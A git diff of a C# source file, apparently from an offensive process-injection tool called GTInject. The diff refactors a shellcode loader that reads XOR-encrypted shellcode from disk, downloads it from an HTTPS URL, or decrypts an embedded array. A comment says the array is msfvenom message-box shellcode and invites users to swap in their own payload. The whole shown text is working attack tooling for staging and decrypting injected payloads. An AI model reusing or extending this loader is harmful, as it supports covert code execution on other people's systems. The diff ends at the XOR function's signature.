@@ -1,64 +1,104 @@
 ﻿using System;
-using System.IO;
 using System.Globalization;
+using System.IO;
+using System.Net.Http;
 
 
 namespace GTInject.GetShellcode
 {
-    internal class GetShellcode
+    // An enum to make the code cleaner and avoid "magic strings"
+    public enum InputType
     {
-        public static byte[] readAndDecryptBytes(string binLocation, string bytePath, string xorkey)
+        Disk,
+        Url,
+        Embedded,
+        Invalid
+    }
+    internal class GetShellcode
+
+    {
+        public static InputType GetInputType(string input)
+        {
+            // 1. Check for the most specific case first: the literal 'embedded'
+            if (string.Equals(input, "embedded", StringComparison.OrdinalIgnoreCase))
+            {
+                return InputType.Embedded;
+            }
+
+            // 2. Check if it's a well-formed absolute HTTPS URL
+            if (Uri.TryCreate(input, UriKind.Absolute, out Uri uriResult)
+                && uriResult.Scheme == Uri.UriSchemeHttps)
+            {
+                return InputType.Url;
+            }
+
+            // 3. Assume it's a file path and check for existence.
+            // This is a reliable way to validate a path you intend to read from.
+            if (File.Exists(input))
+            {
+                return InputType.Disk;
+            }
+
+            // If none of the above, the input is invalid or the file doesn't exist.
+            return InputType.Invalid;
+        }
+        public static byte[] readAndDecryptBytes( string bytePath, string xorkey)
         {
             // This routine will ID where the bytes live, pull them into the program, and decrypt them for further use. 
-
+            InputType type = GetInputType(bytePath);
+            byte[] data = null;
+            byte[] encryptedBytes = null;
+            byte[] decryptedBytes = null;
             // Replace me with your shellcode if embedding shellcode into the tooling - Use: GTInject.exe encrypt yourSC.bin yourXorKey
             // Embedded shellcode is msfvenom msgbox - MySecretXorKey
             byte[] embeddedShellcode = new byte[] { 0xB1, 0x31, 0xD2, 0x81, 0x93, 0x8D, 0x9A, 0x8B, 0xB0, 0xBF, 0x72, 0x4B, 0x65, 0x38, 0x1C, 0x38, 0x03, 0x37, 0x32, 0x24, 0x2D, 0x45, 0x8A, 0x0A, 0x3A, 0xC0, 0x37, 0x19, 0x73, 0x31, 0xD8, 0x37, 0x7B, 0x4C, 0x2D, 0xFF, 0x0A, 0x4F, 0x4C, 0x03, 0xEE, 0x0B, 0x1D, 0x47, 0x1B, 0x6A, 0xD4, 0x38, 0x2F, 0x39, 0x69, 0xA6, 0x3A, 0x7A, 0xA5, 0xD5, 0x71, 0x18, 0x2F, 0x67, 0x4F, 0x52, 0x24, 0xB5, 0x91, 0x62, 0x33, 0x4A, 0xA4, 0x9B, 0xA0, 0x2B, 0x12, 0x34, 0x5D, 0x3A, 0xEE, 0x26, 0x78, 0x51, 0xF9, 0x09, 0x59, 0x31, 0x4C, 0xA9, 0x6D, 0xEE, 0xE3, 0xFA, 0x65, 0x74, 0x58, 0x27, 0xF7, 0x8B, 0x11, 0x16, 0x05, 0x78, 0x83, 0x35, 0x5D, 0xF9, 0x2D, 0x6C, 0x66, 0x2B, 0xF9, 0x0B, 0x45, 0x30, 0x4C, 0xA9, 0xB0, 0x39, 0x2B, 0x8D, 0xAC, 0x4A, 0x19, 0xE4, 0x46, 0xC3, 0x2D, 0x78, 0x9B, 0x34, 0x62, 0xAC, 0x2B, 0x43, 0xA5, 0xD8, 0x19, 0xAE, 0xBB, 0x46, 0x24, 0x78, 0x8C, 0x41, 0xB3, 0x10, 0x92, 0x4C, 0x29, 0x77, 0x14, 0x4B, 0x7A, 0x0E, 0x5C, 0xA8, 0x38, 0xAF, 0x0B, 0x5B, 0x27, 0xF9, 0x25, 0x50, 0x11, 0x6E, 0xA2, 0x2D, 0x5B, 0x38, 0xC6, 0x75, 0x1B, 0x5B, 0x27, 0xF9, 0x25, 0x68, 0x11, 0x6E, 0xA2, 0x75, 0x24, 0xF2, 0x49, 0xF1, 0x1B, 0x64, 0xB3, 0x33, 0x3D, 0x35, 0x00, 0x31, 0x2B, 0x11, 0x24, 0x21, 0x0C, 0x20, 0x12, 0x3F, 0x2B, 0xF1, 0x89, 0x54, 0x19, 0x3D, 0x8D, 0xAB, 0x3D, 0x38, 0x14, 0x23, 0x6D, 0x2D, 0xE8, 0x60, 0x8C, 0x3D, 0xA7, 0x90, 0x8D, 0x16, 0x5B, 0x31, 0xC0, 0xF4, 0x7B, 0x64, 0x63, 0x72, 0x24, 0xCE, 0x14, 0x18, 0x54, 0x4C, 0x9A, 0xAC, 0x04, 0xBE, 0x92, 0x65, 0x63, 0x72, 0x65, 0x4A, 0x10, 0xE2, 0xE7, 0x45, 0x64, 0x79, 0x4D, 0x47, 0x1F, 0xE8, 0xE6, 0x6D, 0x64, 0x74, 0x58, 0x27, 0x43, 0x82, 0x24, 0xC3, 0x08, 0xFA, 0x05, 0x62, 0x9C, 0xA7, 0x2D, 0x45, 0x91, 0x2E, 0xC8, 0xBB, 0xD0, 0xDB, 0x1B, 0x86, 0x86, 0x35, 0x11, 0x1D, 0x06, 0x11, 0x2B, 0x1C, 0x52, 0x02, 0x0B, 0x13, 0x28, 0x1A, 0x27, 0x00, 0x07, 0x72, 0x22, 0x20, 0x11, 0x01, 0x18, 0x2E, 0x06, 0x0D, 0x4D, 0x0C, 0x20, 0x00, 0x11, 0x41, 0x57, 0x5A, 0x3C, 0x03, 0x1E, 0x4B };
-            Console.WriteLine("     bin Location is " + binLocation);
             Console.WriteLine("     bin path is " + bytePath);
-            var byteSource = Enum.TryParse<Inject.sourceLocation>(binLocation, true, out var enumresult);
-            Console.WriteLine("     Byte Source bool: " + byteSource);
-            if (!(byteSource))
-            {
-                // checking for this earlier now, but to lazy to review and remove this
-                Console.WriteLine("[-] Bad Location defined, needs to be embedded, url, or disk, then specify the path to that location");
-                return null;
-            }
-            else if (binLocation.ToLower() == "disk")
-            {
-                Console.WriteLine("     Reading bytes from disk");
-                byte[] encryptedBytes = File.ReadAllBytes(bytePath);
-                Console.WriteLine("     decrypting with xorkey");
-                byte[] decryptedBytes = xorfunction(encryptedBytes, xorkey);
-                Console.WriteLine("     returning plaintext bytes");
-                return decryptedBytes;
 
-            }
-            else if (binLocation.ToLower() == "url")
+            switch (type)
             {
-                try
-                {
-                    Console.WriteLine("     Reading bytes from url");
-                    Uri.IsWellFormedUriString(bytePath, UriKind.RelativeOrAbsolute);
-                    var wc = new System.Net.WebClient();
-                    var resp = wc.DownloadString(bytePath);
-                    byte[] encryptedBytes = Convert.FromBase64String(resp);
-                    byte[] decryptedBytes = xorfunction(encryptedBytes, xorkey);
-                    return decryptedBytes;
+                case InputType.Disk:
 
-                }
-                catch
-                {
-                    Console.WriteLine("[-] URL wasn't properly defined, should be something like https://example.com/base64AndXordPayload");
-                    return null;
-                }
+                    Console.WriteLine("     Reading bytes from disk");
+                    encryptedBytes = File.ReadAllBytes(bytePath);
+                    Console.WriteLine("     decrypting with xorkey");
+                    decryptedBytes = xorfunction(encryptedBytes, xorkey);
+                    Console.WriteLine("     returning plaintext bytes");
+                    data =  decryptedBytes;
+                    break;
 
+                case InputType.Url:
+                    try
+                    {
+                        Console.WriteLine("     Reading bytes from url");
+                        Uri.IsWellFormedUriString(bytePath, UriKind.RelativeOrAbsolute);
+                        var wc = new System.Net.WebClient();
+                        var resp = wc.DownloadString(bytePath);
+                        encryptedBytes = Convert.FromBase64String(resp);
+                        decryptedBytes = xorfunction(encryptedBytes, xorkey);
+                        data = decryptedBytes;
+
+                    }
+                    catch
+                    {
+                        Console.WriteLine("[-] URL wasn't properly defined, should be something like https://example.com/base64AndXordPayload");
+                        return null;
+                    }
+                    break;
+
+                case InputType.Embedded:
+                    Console.WriteLine("-> Getting bytes from embedded resource...");
+                    // Your logic to retrieve the embedded resource bytes would go here
+                    decryptedBytes = xorfunction(embeddedShellcode, xorkey);
+
+                    data = decryptedBytes;
+                    break;
+
+                case InputType.Invalid:
+                    Console.WriteLine("-> Input is invalid or file/URL not found.");
+                    break;
             }
-            else // use embbeded
-            {
-                byte[] decryptedBytes = xorfunction(embeddedShellcode, xorkey);
-                return decryptedBytes;
-            }
+            return data;
+
         }
 
         private static byte[] xorfunction(byte[] xorBytes, string xorkey)
